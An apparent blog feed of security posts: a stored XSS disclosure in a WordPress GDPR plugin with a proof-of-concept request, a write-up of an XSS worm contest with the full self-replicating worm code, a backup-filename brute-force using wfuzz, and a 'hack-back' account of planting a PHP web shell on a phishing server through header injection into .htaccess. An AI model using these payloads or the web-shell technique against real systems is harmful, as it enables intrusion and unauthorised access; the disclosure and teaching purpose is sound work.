<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /wp-admin/admin-ajax.php HTTP/1.1
Host: 0.0.0.0:31337
X-Forwarded-For: 1.1.1.1"&gt;&lt;img src=x onerror=alert(1)&gt;

action=wpgdprc_process_action&amp;security=cccf5a60ec&amp;data={"type":"access_request","email":"xss@example.com","consent":true}
</code></pre></div></div>

<p><img src="/assets/img/2021/02/gdpr-xss-poc.png" alt="" title="Proof of Concept" /></p>

<hr />

<h3 id="fix">Fix</h3>

<p>Fix for the vulnerability <a href="https://plugins.trac.wordpress.org/changeset/2474862/">was released</a>  in version 1.5.6 via adding to the check:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if ($ipAddress === false) {
    return false;
}
</code></pre></div></div>

<p>The user input is now correctly escaped, but the IP address column is still <code class="language-plaintext highlighter-rouge">varchar(255)</code>. Also, only the <em>PATCH</em> version was incremented, instead of the <em>MINOR</em> version, so it’s hard to track the updated plugins’ percentage via the advanced WordPress statistic. I believe it was a correct decision, but bumping it to <code class="language-plaintext highlighter-rouge">1.6</code> would be much better from the security point of view.</p>

<p><img src="/assets/img/2021/02/gdpr-changelog.png" alt="" title="Changelog" /></p>

<hr />

<p>When checking <a href="https://wpscan.com/vulnerability/678dac05-d1f7-4e73-a310-dffa8f5bb9c4">WPScan</a> to verify that it’s not a known vulnerability, I realized that this is, in fact, the (in)famous GDPR plugin, which resulted in a <a href="https://www.wordfence.com/blog/2018/11/privilege-escalation-flaw-in-wp-gdpr-compliance-plugin-exploited-in-the-wild/">full compromise</a>  of hundreds/thousands of websites back in 2018. But I must say that I was impressed by the fast response &amp; fix from the developer. Unfortunately for me, stored XSS is not a valid finding for Detectify. I did a quick recon for HackerOne in-scope items but didn’t find any hit. Maybe I will be lucky next time :)</p>

<hr />

<p>By observing a spike in the “<a href="https://wordpress.org/plugins/wp-gdpr-compliance/advanced/">Downloads per day</a>” graph during the week after the fix release, we can estimate that approximately ~50k websites updated the plugin, which is about 1/4 of all active installations. The stats are somewhat consistent with past releases and could indicate that we won’t see any more websites updating to the latest version, so it might be a good idea to spread the news.</p>

<table>
  <thead>
    <tr>
      <th>Date</th>
      <th>Downloads</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>2021-02-15</td>
      <td>23541</td>
    </tr>
    <tr>
      <td>2021-02-16</td>
      <td>12869</td>
    </tr>
    <tr>
      <td>2021-02-17</td>
      <td>5757</td>
    </tr>
    <tr>
      <td>2021-02-18</td>
      <td>3964</td>
    </tr>
    <tr>
      <td>2021-02-19</td>
      <td>3107</td>
    </tr>
    <tr>
      <td>2021-02-20</td>
      <td>2076</td>
    </tr>
    <tr>
      <td>2021-02-21</td>
      <td>1808</td>
    </tr>
    <tr>
      <td>2021-02-22</td>
      <td>3192</td>
    </tr>
  </tbody>
</table>

<p><img src="/assets/img/2021/02/gdpr-downloads.png" alt="" title="Downloads Per Day" /></p>

<hr />

<h3 id="timeline">Timeline</h3>

<ul>
  <li>Friday, February 12th, 2021 ~ Notified a developer about the vulnerability</li>
  <li>Friday, February 12th, 2021 ~ Finished testing and proposed a fix</li>
  <li>Saturday, February 13th, 2021 ~ Received a response confirming that the developer received the information and will begin working on a fix</li>
  <li>Monday, February 15th, 2021 ~ The developer released a patched version of the plugin as of version 1.5.6</li>
  <li>Tuesday, February 23rd, 2021 ~ Blog post with the details disclosed to the public</li>
</ul>

<h3 id="references">References</h3>

<p><a href="https://wpscan.com/vulnerability/69655879-9fd5-49a3-96ce-81e43b8d8438">wpscan.com/vulnerability/69655879-9fd5-49a3-96ce-81e43b8d8438</a></p>]]></content><author><name>vavkamil</name></author><category term="Ethical hacking" /><category term="Responsible disclosure" /><category term="Bug bounty" /><category term="0day" /><category term="exploit" /><category term="vulnerability" /><category term="WordPress" /><summary type="html"><![CDATA[tl;dr: The GDPR Compliance &lt;= 1.5.5 plugin allowed unauthenticated users to exploit Stored Cross-Site Scripting (XSS) in the administration panel, which might lead to the privilege escalation. That was due to clients’ IP Addresses reflected in the plugin’s dashboard without being correctly validated or escaped.]]></summary></entry><entry><title type="html">XSSworm.dev ~ Self-replication contest [write-up]</title><link href="http://localhost:4000/blog/2020-12-01-xss-worm-dev-self-replication-contest-write-up/" rel="alternate" type="text/html" title="XSSworm.dev ~ Self-replication contest [write-up]" /><published>2020-12-01T01:00:00+01:00</published><updated>2020-12-01T01:00:00+01:00</updated><id>http://localhost:4000/blog/xss-worm-dev-self-replication-contest-write-up</id><content type="html" xml:base="http://localhost:4000/blog/2020-12-01-xss-worm-dev-self-replication-contest-write-up/"><![CDATA[<p>tl;dr: I created “CTF” style challenge for our <strong><a href="https://www.meetup.com/owasp-czech-republic-meetup-group/events/274616231/">OWASP Czech Chapter Virtual Meeting</a></strong>. The goal was to write an XSS worm and score points by infecting 1k virtual users. You can find the source code <a href="https://github.com/vavkamil/XSSworm.dev">here</a> and read the details in this post.</p>

<hr />

<p>When the whole covid-19 thing started, I was somehow interested in looking at various coronavirus world maps and watching the exponential growth of the pandemic unfold. It reminded me of the (in)famous MySpace; “<a href="https://samy.pl/myspace/tech.html">Samy worm</a>” by <a href="https://en.wikipedia.org/wiki/Samy_Kamkar">Samy Kamkar</a>. For those of you who never heard about it, it was the first publicly released self-propagating cross-site scripting worm, onto MySpace, in 2005. The worm was able to infect over one million users had run the payload in one day.</p>

<p>Since then, we have seen some other XSS worms, for example, on Yahoo, Twitter or Orkut. But nothing at the scale of The MySpace worm.</p>

<p>In 2008, <a href="https://twitter.com/rsnake?lang=en">@RSnake</a> published “<em><a href="https://web.archive.org/web/20080210014614/http://sla.ckers.org/forum/read.php?2,18790,18790">Diminutive XSS Worm Replication Contest</a></em>” on sla.ckers.org. It was an awesome idea, but there was some <a href="https://forums.theregister.com/forum/all/2008/01/05/worm_replication_contest/">backlash</a> as well :(</p>

<p>But why am I talking about this? Well, in 2008, I was 16 years old. I knew only the basic English, but I was lucky enough to be mentored by the best hackers in the Czechia at the time. Couple of months after the RSnake’s contest, one member of our community took the idea and created an interface where we could test our XSS worms and compete with others. It looked like this:</p>

<p><img src="/assets/img/2020/12/skola.png" alt="" /></p>

<p>There were 200 bot accounts and we (~4 people) scored points by infecting them with our worms and marking them with our color &amp; nick via CSRF. You can still find the pieces of the original web archived <a href="https://web.archive.org/web/20080320190901/http://xsscontest.xf.cz/?action=stats&amp;PHPSESSID=e8b6a4ab2a69f128ed44fa933bb7584e">here</a> and the XSS worm source <a href="https://web.archive.org/web/20080717202916/http://skola.security-portal.cz/[4194]-XSS-CONTEST-WARRIOR_0x13.txt">here</a>. It may sound weird, but this “contest”, writing XSS worms and payloads to steal cookies, is one of my happiest childhood memories :)</p>

<p>So one evening, when I was checking the coronavirus map, I had a big flashback and immediately started coding the remastered version. The things is, I’m not a developer, so it took quite some time. In May 2020, I had a working Proof of Concept, which looked like this:</p>

<p><img src="/assets/img/2020/12/challenge-poc.png" alt="" /></p>

<p>At that point, I realized that it’s <em>scalable</em> and I might be able to pull it off and write a CTF style contest for our upcoming OWASP Czech Chapter meeting. I did some research and decided to go with a simple Python Flask application and a cluster of puppeteer workers for the bots.</p>

<p>Then the situation with covid got worse, and we had to postpone the OWASP meeting. We had to postpone multiple times and eventually cancel the whole thing because of the lockdown. On the bright side, I had plenty of time for coding and polishing. So how does it work?</p>

<p><img src="/assets/img/2020/12/web.png" alt="" /></p>

<p>It’s somehow simple. The user will register with the nickname and team color. They are then presented with a simple interface to send messages to bots. But here is a catch, each user has a limit of 13 messages which could be sent. Based on the swagger documentation, they need to write the XSS worm, which will leverage two CSRFs. One to change the bot’s color and the other to self propagate via the bot’s unlimited private messages. The point of a limited number of messages is to force the users to design an efficient infection algorithm, which will spread exponentially.</p>

<p>There is a grid of 1k boxes, which helps to visualize the bots. If they are infected, and by whom. Users are scoring points by infecting and reinfecting the bots and marking them with their team color.</p>

<p><img src="/assets/img/2020/12/example.png" alt="" /></p>

<p>The puppeteer cluster is then reading the last received messages of each bot in a random sequence every X minutes. The cluster code looks like this, it’s just going through the array in random order, authenticated with cookies:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>const { Cluster } = require('puppeteer-cluster');

(async () =&gt; {
  const cluster = await Cluster.launch({
    concurrency: Cluster.CONCURRENCY_CONTEXT,
    maxConcurrency: 5,
    // puppeteerOptions: { headless: false },
    // puppeteerOptions: { args: ['--no-sandbox'] },
    timeout: 666,
    monitor: true,
  });

  await cluster.task(async ({ page, data }) =&gt; {
    const { url, id } = data;
    await page.setCookie({
      'value':id,
      'domain': 'xssworm.dev',
      'expires': Date.now() / 1000 + 10,
      'name': '31p475~Yr37748-35r0h~7c3rr0C-ID',
      'httpOnly': true
    });
    await page.setCookie({
      'value':'correct-horse-battery-staple',
      'domain': 'xssworm.dev',
      'expires': Date.now() / 1000 + 10,
      'name': 'secret',
      'httpOnly': true
    });
    await page.goto(url);
    await page.waitFor(666);
    //const screen = await page.screenshot();
    // Store screenshot, do something else
  });

  var array = Array.from({length: 1001}, (_, i) =&gt; [i, Math.random()]).sort((a, b) =&gt; a[1] - b[1]).map(([n, r]) =&gt; n)
  for (var i = 0; i &lt; array.length; i++) {
    //console.log(array[i]);
    var url = "https://xssworm.dev/read-message?id="+array[i];
    cluster.queue({url, id:""+array[i]+""});
  // many more pages
  }

  await cluster.idle();
  await cluster.close();
})();
</code></pre></div></div>

<p>There are some basic rules for users. They should be able to write the self-propagating code in just 13 tries. Once their worm hits exponential growth, they should be able to infect most of the victims.</p>

<p><img src="/assets/img/2020/12/rules.png" alt="" /></p>

<p>After the registration, users are presented with <a href="https://editor.swagger.io/?url=https://raw.githubusercontent.com/vavkamil/XSSworm.dev/main/static/swagger.yaml">Swagger documentation</a>. They were supposed to write a code, which will send two POST requests, one to change to the color of the victim, the other to replicate its code and spread to another victim. The tricky part was <em>application/x-www-form-urlencoded</em>, as most of the contestants struggled to get the encoding right, so either the ‘+’ sign was stripped, or the ‘#’ representing hex value of the color was double encoded.</p>

<p><img src="/assets/img/2020/12/swagger.png" alt="" /></p>

<p>Only one player was able to write the functional self-spreading XSS worm in time and eventually won the whole competition. They designed three different algorithms, as they could register again and resend the updated version to 13 victims.</p>

<p><img src="/assets/img/2020/12/interface.png" alt="" /></p>

<p>There is a lot of things to improve in my code. I used a rather strict Content Security Policy. The whole deployment should be in docker. I was even thinking about implementing CSRF tokens and Twitter OAuth. For more experienced users, XSS protection to bypass would be ideal. The one thing that I struggled with the most was how to prevent a race condition and how to protect the number of messages that the user can send :( But anyway, I’m glad that people enjoyed the challenge, even in those hard times.</p>

<p>Here you can check my Proof of Concept of the worm:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script id="xss_worm"&gt;

	// XSS worm .dev
	// Self-replication contest
	// Proof of Concept v1.0

	var victims = 1000;
	var team_color = "#550bb1";
	var url = "https://xssworm.dev";
	var infection_code = "&lt;script id=\"xss_worm\"&gt;"+self_propagation()+"&lt;\/script&gt;";

	infect_victim(team_color);

	while (true) {
		var victim_id = get_random_victim(victims);
		spread_infection(victim_id,infection_code);
	}

	function get_random_victim(accounts_count) {
		return Math.floor((Math.random() * accounts_count) + 1);
	}

	function infect_victim(color) {
		var xhr = new XMLHttpRequest();
		var params = "color="+color;
		xhr.open("POST", url+"/update", true);
		xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		xhr.send(params);
	}

	function self_propagation(){
		return document.getElementById("xss_worm").innerHTML;
	}

	function spread_infection(id,infection_code) {
		var xhr = new XMLHttpRequest();
		var params = "id="+id+"&amp;msg="+encodeURIComponent(infection_code);
		xhr.open("POST", url+"/send-message", true);
		xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		xhr.send(params);
	}

&lt;/script&gt;
</code></pre></div></div>

<p>You can check and try <a href="https://xssworm.dev">the website</a>, as I will keep the infrastructure alive for a while, or you can deploy it locally, as the whole thing is open-source. I’m a little bit ashamed of my programming skills, but here you go: <a href="https://github.com/vavkamil/XSSworm.dev">https://github.com/vavkamil/XSSworm.dev</a></p>]]></content><author><name>vavkamil</name></author><category term="Ethical hacking" /><category term="Tools" /><category term="XSS" /><category term="worm" /><summary type="html"><![CDATA[tl;dr: I created “CTF” style challenge for our OWASP Czech Chapter Virtual Meeting. The goal was to write an XSS worm and score points by infecting 1k virtual users. You can find the source code here and read the details in this post.]]></summary></entry><entry><title type="html">All-in-One WP Migration &amp;lt;=7.14 Arbitrary Backup Download</title><link href="http://localhost:4000/blog/2020-03-25-all-in-one-wp-migration/" rel="alternate" type="text/html" title="All-in-One WP Migration &amp;lt;=7.14 Arbitrary Backup Download" /><published>2020-03-25T01:00:00+01:00</published><updated>2020-03-25T01:00:00+01:00</updated><id>http://localhost:4000/blog/all-in-one-wp-migration</id><content type="html" xml:base="http://localhost:4000/blog/2020-03-25-all-in-one-wp-migration/"><![CDATA[<hr />

<!-- wp:paragraph -->
<p>A long time ago, I made a stupid decision to use WordPress for this blog about offensive website security. Since then, I learned a lot. I will be releasing a plugin to defend against <a rel="noreferrer noopener" aria-label="XML-RPC attacks (opens in a new tab)" href="https://twitter.com/vavkamil/status/1231298635561930752" target="_blank">XML-RPC attacks</a> and guide how to generate a static HTML site in upcoming weeks.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>But today I would like to share an interesting vulnerability that I found in a popular WordPress plugin with 2+ million active installations. I was looking for an easy-to-use backup plugin and <a href="https://wordpress.org/plugins/all-in-one-wp-migration" target="_blank" rel="noreferrer noopener" aria-label="All-in-One WP Migration (opens in a new tab)">All-in-One WP Migration</a> by ServMask seemed like a good choice.</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><p>This plugin exports your WordPress website including the database, media files, plugins and themes with no technical knowledge required. Move, transfer, copy, migrate, and backup a site with 1-click. Quick, easy, and reliable.</p><cite>All-in-One WP Migration plugin description</cite></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p>After installing the plugin and creating the first backup, the filename didn't look too random. I was wondering if it could be guessed by an attacker and somehow downloaded without the authenticated access.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":770,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="/assets/img/2020/03/backup-1024x179.png" alt="" class="wp-image-770" /><figcaption>vavkamil.cz-20200324-214633-123.wpress</figcaption></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>While checking the code, I  found out that it's just a <strong>domain-date-time-rand(100,999).wpress</strong> and the backup itself was publicly accessible via <strong>vavkamil.cz/wp-content/ai1wm-backups/vavkamil.cz-20200324-214633-123.wpress</strong></p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":771,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="/assets/img/2020/03/backup-source.png" alt="" class="wp-image-771" /><figcaption>Function to generate file name</figcaption></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>This seemed bad, but it would still require a huge amount of requests and pure luck to brute-force it. In the "<strong>wp-content/ai1wm-backups</strong>" folder, there were three additional files preventing directory listing:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>index.php</li><li>.htaccess</li><li>web.config</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Back then, I didn't know what a "<strong>web.config</strong>" is for, but I was able to download it. There was nothing useful, it's basically .htaccess for Microsoft IIS server. Normally I would probably stop there, but I just finished reading <a href="https://www.goodreads.com/book/show/46223297-permanent-record" target="_blank" rel="noreferrer noopener" aria-label="Permanent Record (opens in a new tab)">Permanent Record</a> by Edward Snowden and remembered about the metadata :)</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>By downloading the <strong>web.config</strong> file and checking the <strong>Last-Modified</strong> metadata header, we can determine the exact date a time when the plugin was installed. Let's assume the user will install the All-in-One WP Migration plugin and create a backup within the first 10 minutes after the installation. The attacker can brute-force the backup file name with approximately 600k requests.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>I quickly wrote a <a rel="noreferrer noopener" aria-label="simple python script (opens in a new tab)" href="https://gist.github.com/vavkamil/b54683430bd21d7fdade2ebdcf70cc82" target="_blank">simple python script</a> to extract the metadata and used <a href="https://github.com/xmendez/wfuzz" target="_blank" rel="noreferrer noopener" aria-label="wfuzz (opens in a new tab)">wfuzz</a> as a proof of concept:</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>wfuzz -c -z range,33-59 -z range,100-999 -X HEAD --sc 200 https://vavkamil.cz/wp-content/ai1wm-backups/vavkamil.cz-20200324-2146FUZZ-FUZ2Z.wpress</strong></p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":772,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="/assets/img/2020/03/wfuzz.png" alt="" class="wp-image-772" /><figcaption>Proof of concept using Wfuzz</figcaption></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The wfuzz parameters can be slightly modified to add a reasonable delay between the installation and first backup creation, or you can just try pure luck.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Now when the attacker can determine the backup file name and download it, he can use <a href="https://github.com/fifthsegment/Wpress-Extractor" target="_blank" rel="noreferrer noopener" aria-label=".wpress extractor (opens in a new tab)">.wpress extractor</a> to dump the database content from the archive, or just install the plugin to a fresh website and import the backup.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>It's worth mentioning that even if you uninstalled the plugin, the "<strong>ai1wm-backups</strong>" folder with all the backups was not deleted, and therefore you may still be vulnerable.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>I scanned <a rel="noreferrer noopener" aria-label="hackerone/bugcrowd scope (opens in a new tab)" href="https://github.com/arkadiyt/bounty-targets-data" target="_blank">hackerone/bugcrowd scope</a> for bug bounty hunting purposes and was able to find ~20 blogs with the plugin installed, but I wasn't able to exploit any (mainly as I didn't want to bother them with a huge amount of requests). On the other hand, I exploited a hand-full of websites during the responsible disclosure among my clients, and this blog was also vulnerable/exploitable.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>I reported the issue to the author and it was quickly fixed in version 7.15 (Exclude web.config and .htaccess direct access from each other). That means that it's no longer possible to download .htaccess file from IIS and web.config file from Apache. With the next updates, there were introduced some changes and the backup file name is more random.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Timeline:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>Jan 13, 2020: Reported the vulnerability</li><li>Jan 13, 2020: Response from vendor</li><li>Jan 15, 2020: Ticket marked as resolved</li><li>Jan 20, 2020: Version 7.15 released, vulnerability fixed</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Credits</strong>: <em><a href="https://ixia.keysight.com/company/blog/missing-updates-and-site-misconfiguration-can-lead-exposed-backups" target="_blank" rel="noreferrer noopener" aria-label="https://ixia.keysight.com/company/blog/missing-updates-and-site-misconfiguration-can-lead-exposed-backups (opens in a new tab)">https://ixia.keysight.com/company/blog/missing-updates-and-site-misconfiguration-can-lead-exposed-backups</a></em></p>
<!-- /wp:paragraph -->]]></content><author><name>vavkamil</name></author><category term="Ethical hacking" /><category term="Responsible disclosure" /><category term="0day" /><category term="exploit" /><category term="vulnerability" /><category term="WordPress" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Hack-back: the tale of embarrassing phishing campaign</title><link href="http://localhost:4000/blog/2020-01-14-hack-back-the-tale-of-embarrassing-phishing-campaign/" rel="alternate" type="text/html" title="Hack-back: the tale of embarrassing phishing campaign" /><published>2020-01-14T01:00:00+01:00</published><updated>2020-01-14T01:00:00+01:00</updated><id>http://localhost:4000/blog/hack-back-the-tale-of-embarrassing-phishing-campaign</id><content type="html" xml:base="http://localhost:4000/blog/2020-01-14-hack-back-the-tale-of-embarrassing-phishing-campaign/"><![CDATA[<hr />

<!-- wp:paragraph -->
<p>UPDATE: 17th January 2020: Another <a rel="noreferrer noopener" aria-label="landing page disabled (opens in a new tab)" href="https://www.reddit.com/r/ProtonMail/comments/eor72x/just_took_down_a_phishing_server_aimed_at/felm2ud" target="_blank">landing page disabled</a>.</p>
<!-- /wp:paragraph -->

<!-- wp:separator {"className":"is-style-wide"} -->
<hr class="wp-block-separator is-style-wide" />

<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>UPDATE: 15th January 2020: I posted this to reddit.com/r/hacking and it seems like the mods didn't like it, they consider my blog post as a self-promotion and spam. Thank you!<br /><em>You have been permanently banned from participating in r/hacking<br />You have been permanently banned from participating in r/ActLikeYouBelong<br />You have been permanently banned from participating in r/AskNetsec</em></p>
<!-- /wp:paragraph -->

<!-- wp:separator {"className":"is-style-wide"} -->
<hr class="wp-block-separator is-style-wide" />

<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>Today was a good day, I received a phishing email to by <a rel="noreferrer noopener" aria-label="Protonmail (opens in a new tab)" href="https://protonmail.com" target="_blank">Protonmail</a> address. I don't have a copy of the email, as I reported it and later deleted it as spam. Thankfully, other security research took screenshots yesterday:</p>
<!-- /wp:paragraph -->

<!-- wp:core-embed/twitter {"url":"https://twitter.com/d4rkm0de/status/1216740446178889729","type":"rich","providerNameSlug":"twitter"} -->
<figure class="wp-block-embed-twitter wp-block-embed is-type-rich is-provider-twitter"><div class="wp-block-embed__wrapper">
https://twitter.com/d4rkm0de/status/1216740446178889729
</div><figcaption>Credits to @d4rkm0de</figcaption></figure>
<!-- /wp:core-embed/twitter -->

<!-- wp:core-embed/twitter {"url":"https://twitter.com/vavkamil/status/1217173739676274689","type":"rich","providerNameSlug":"twitter"} -->
<figure class="wp-block-embed-twitter wp-block-embed is-type-rich is-provider-twitter"><div class="wp-block-embed__wrapper">
https://twitter.com/vavkamil/status/1217173739676274689
</div><figcaption>Figured I can do a write-up after the tweet</figcaption></figure>
<!-- /wp:core-embed/twitter -->

<!-- wp:paragraph -->
<p>The phishing mail was included a Bitly link (URL shortener). The nice thing about Bitly is that you can add a plus (+) character on the end of URL and it will show you how many people clicked the link and what is the location of redirect:</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":715,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="/assets/img/2020/01/image.png" alt="" class="wp-image-715" /><figcaption>https://bitly.com/2R1paP9+</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>More than 100 people clicked the link when I received the phishing email. I was a little bit bored, so I started poking around a little bit. I quickly found a directory listing with full source code:</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":716,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="/assets/img/2020/01/image-1.png" alt="" class="wp-image-716" /><figcaption>Prevent this by adding "Options -Indexes" to .htaccess</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The landing page was written in PHP, it was kinda a generic one, nothing unordinary, except a <code>blocker.php</code>file. It was a code to block security researchers and malware hunters based on IP ranges and user-agent strings. If any of the above matched, the IP was denied access in <code>.htaccess</code> and added to a file <code>badbot.txt</code> for a further investigation.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The fourth line got my attention, as it was very unique:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>$ipa = $_SERVER&#91;'HTTP_CLIENT_IP']? $_SERVER&#91;'HTTP_CLIENT_IP'] : ($_SERVER&#91;'HTTP_X_FORWARDE‌​D_FOR'] ? $_SERVER&#91;'HTTP_X_FORWARDED_FOR'] : $_SERVER&#91;'REMOTE_ADDR'] );
$useragent = $_SERVER&#91;'HTTP_USER_AGENT'];

if(isset($_POST&#91;'gotcha'])){
     blockBot($ipa);
}</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>The thing in web security is, you should never trust user input. In this case, you can spoof both <code>HTTP_CLIENT_IP</code> and <code>HTTP_X_FORWARDED_FOR</code> headers.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>If you called the <code>blocker.php</code> script with a POST request and <code>gotcha</code> parameter, the IP address was blocked:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>function blockBot($ip){
$bot = 'deny from '.$ip;
$myfile = file_put_contents('.htaccess', PHP_EOL.$bot.PHP_EOL , FILE_APPEND | LOCK_EX);
header('HTTP/1.0 404 Not Found');
die("&lt;h1&gt;404 Not Found&lt;/h1&gt;The page that you have requested could not be found.");
}</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>If the user-agent matched any array value like <code>InfoSec, Kaspersky, ...</code>, the IP was added to <code>badbot.txt</code>:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>foreach($bad as $zbal) {
    if(stripos($useragent,$zbal) !== false) {
        file_put_contents('badbot.txt', $ipa, FILE_APPEND | LOCK_EX);
        blockBot($ipa);
    }
}</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>So I quickly figured out that I can insert PHP shell to <code>badbot.txt</code> and force .htaccess to execute .txt files as PHP. The trick from the 2000s used to hack insecure PHP uploads :)</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Inserting PHP web shell into <code>badbot.txt</code> (learned this one from <a rel="noreferrer noopener" aria-label="Sucuri (opens in a new tab)" href="https://blog.sucuri.net/2014/02/php-backdoors-hidden-with-clever-use-of-extract-function.html" target="_blank">Sucuri</a>):</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>curl $url/blocker.php -H "CLIENT-IP: &lt;?php extract($_REQUEST);$a($b); ?&gt; " -H "User-agent: InfoSec"</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Forcing Apache to execute .txt as PHP via .htaccess:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>curl $url/blocker.php -H "CLIENT-IP: \r\nAddType application/x-httpd-php .txt\r\n" -H "User-agent: google" --data "gotcha=1"</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>This can be a very nice CTF challenge, full source-code here: <a rel="noreferrer noopener" aria-label="https://gist.github.com/vavkamil/b115ef829329f9fd3876c077e843641b (opens in a new tab)" href="https://gist.github.com/vavkamil/b115ef829329f9fd3876c077e843641b" target="_blank">https://gist.github.com/vavkamil/b115ef829329f9fd3876c077e843641b</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>In the end, I was able to take down the phishing infrastructure in less than 30 minutes, and maybe saved someone from a compromise. Mess with the best, die like the rest!</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Indicators of compromise (IoC):</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>urielsilveira[dot]com</li><li>keyword.tech.2017[at]gmail.com</li><li>alvinwalker247[at]gmail.com</li></ul>
<!-- /wp:list -->

<!-- wp:image {"id":719,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="/assets/img/2020/01/error_500.png" alt="" class="wp-image-719" /><figcaption>Phishing out of service</figcaption></figure>
<!-- /wp:image -->]]></content><author><name>vavkamil</name></author><category term="Ethical hacking" /><category term="Privacy" /><category term="hack-back" /><category term="phishing" /><category term="PHP" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">An introduction to the Router Exploit Kits</title><link href="http://localhost:4000/blog/2019-12-11-an-introduction-to-the-router-exploit-kits/" rel="alternate" type="text/html" title="An introduction to the Router Exploit Kits" /><published>2019-12-11T01:00:00+01:00</published><updated>2019-12-11T01:00:00+01:00</updated><id>http://localhost:4000/blog/an-introduction-to-the-router-exploit-kits</id><content type="html" xml:base="http://localhost:4000/blog/2019-12-11-an-introduction-to-the-router-exploit-kits/"><![CDATA[<hr />

<!-- wp:paragraph -->
<p><a href="https://www.eventbrite.com/e/owasp-czech-chapter-meeting-registration-83052487225" target="_blank" rel="noreferrer noopener" aria-label="OWASP Czech Chapter Meeting, Dec 11, 2019 ~ Brno (opens in a new tab)">OWASP Czech Chapter Meeting, Dec 11, 2019 ~ Brno</a></p>
<!-- /wp:paragraph -->

<!-- wp:html -->
<object data="/assets/img/2019/12/an-introduction-to-the-router-exploit-kits.pdf" alt="pdf" width="800" height="400"></object>
<!-- /wp:html -->

<!-- wp:paragraph -->
<p><a href="/assets/img/2019/12/an-introduction-to-the-router-exploit-kits.pdf">/assets/img/2019/12/an-introduction-to-the-router-exploit-kits.pdf</a></p>
<!-- /wp:paragraph -->

<div style="padding:56.25% 0 0 0;position:relative;"><iframe src="https://player.vimeo.com/video/383300304" style="position:absolute;top:0;left:0;width:100%;height:100%;" frameborder="0" allow="autoplay; fullscreen; picture-in-picture" allowfullscreen=""></iframe></div>
<script src="https://player.vimeo.com/api/player.js"></script>

<p><a href="https://vimeo.com/383300304">2019-12-11-Kamil Vavra - An introduction to the router exploit kits2019-12-11-</a> from <a href="https://vimeo.com/user95142672">Czech OWASP chapter</a> on <a href="https://vimeo.com">Vimeo</a>.</p>]]></content><author><name>vavkamil</name></author><category term="Ethical hacking" /><category term="Privacy" /><category term="Public talks" /><category term="CSRF" /><category term="dns" /><category term="DNS hijacking" /><category term="ghostdns" /><category term="novidade" /><category term="router exploit kit" /><summary type="html"><![CDATA[]]></summary></entry></feed>